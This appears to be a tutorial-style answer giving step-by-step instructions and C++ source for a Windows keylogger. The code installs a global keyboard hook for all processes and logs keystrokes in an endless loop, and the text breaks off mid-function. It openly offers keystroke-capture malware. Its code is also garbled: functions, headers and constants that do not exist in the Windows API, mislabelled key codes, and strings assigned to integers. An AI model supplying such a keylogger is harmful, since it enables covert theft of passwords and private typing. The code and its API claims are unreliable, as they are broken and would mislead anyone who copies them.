1. **Include Necessary Headers**: Include `windows.h` and `User32.h` for the required functions and definitions.

2. **Define the Callback Function**: Create a function `KeyPressCallback` that handles the keyboard events. This function will be called for each key press and release.

3. **Initialize the Hook**: Use `SetWindowsHook` to install a keyboard hook. This allows your application to receive keyboard events.

4. **Set Up the Hook**: Install the hook for all processes and specify the callback function.

5. **Log Key Strokes**: In the callback, check if the event is a key press (`KeyDown`). Use `GetAsyncKeyState` to determine the state of each modifier key (Shift, Ctrl, Alt) and construct the key string accordingly.

6. **Uninstall the Hook**: Once done, use `UnhookKeyboard` to remove the hook to free resources.

7. **Handle Cleanup**: Ensure the hook is properly cleaned up to avoid any issues.

Here's the complete code:

```c++
#include <Windows.h>
#include <User32.h>
#include <iostream>

using namespace std;

void KeyPressCallback(int event, HWND hwnd, KBDOWN or KUP, int time);
void SetHook();
void Unhook();

string GetKeyName(int key);

int main() {
    SetHook();
    while (true) {
        // Keep the program running to capture keystrokes
        Sleep(1);
    }
    return 0;
}

void SetHook() {
    HHOOK hKeyboard = SetWindowsHook(WH_KEYBOARD_LL, KeyPressCallback);
    // Install the hook for all processes
    SetWindowHook(hKeyboard, HWND_Broad);
}

void KeyPressCallback(int event, HWND hwnd, int key, int time) {
    if (event != KEYDOWN) {
        return;
    }
    // Check if modifiers are pressed
    int modifiers = GetAsyncKeyState(0x20); // For Shift
    int ctrl = GetAsyncKeyState(0x10);  // For Ctrl
    int alt = GetAsyncKeyState(0xA0);   // For Alt
    int shift = (modifiers & 0x20) ? "Shift" : "";
    int ctrl_state = (ctrl ? "Ctrl" : "");
    int alt_state = (alt ? "Alt" : "");

